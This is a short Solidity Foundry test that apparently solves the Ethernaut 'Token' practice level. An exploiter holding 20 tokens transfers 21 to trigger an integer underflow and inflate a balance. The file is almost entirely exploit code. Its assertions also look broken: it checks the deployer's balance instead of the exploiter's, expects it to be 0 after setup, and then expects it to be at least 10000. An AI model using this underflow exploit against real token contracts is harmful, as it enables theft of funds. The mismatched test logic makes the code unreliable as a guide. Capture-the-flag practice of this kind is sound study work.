// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

import '../../src/EthernautCTF/Token.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract TokenExploit is Test {
  Token target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Token(10000);
    console2.log('Target contract deployed');

    assertTrue(target.transfer(exploiter, 20));
    console2.log('20 tokens given to exploiter');
    vm.stopPrank();
  }

  function testExploit() public {
    uint256 balance = target.balanceOf(deployer);
    console2.log('Balance: %d', balance);
    assertEq(balance, 0);

    vm.startPrank(exploiter);
    assertTrue(target.transfer(address(0x0), 21));
    vm.stopPrank();

    balance = target.balanceOf(deployer);
    console2.log('Balance: %d', balance);
    assertTrue(balance >= 10000);
  }
}
